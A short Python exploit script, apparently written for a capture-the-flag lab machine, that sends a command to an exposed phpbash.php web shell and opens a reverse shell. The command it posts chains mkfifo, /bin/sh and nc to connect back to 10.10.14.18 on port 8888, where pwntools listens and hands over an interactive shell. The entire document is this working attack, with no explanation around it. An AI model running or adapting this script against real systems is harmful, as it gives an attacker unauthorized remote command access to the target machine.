#!/usr/bin/python3
import threading, requests
from pwn import *

def cmd():
  target = "http://10.10.10.68/dev/phpbash.php"
  data = {"cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 8888 >/tmp/f"}
  requests.post(target, data)
  
threading.Thread(target=cmd).start()
shell = listen(8888, timeout=20).wait_for_connection()
shell.interactive()
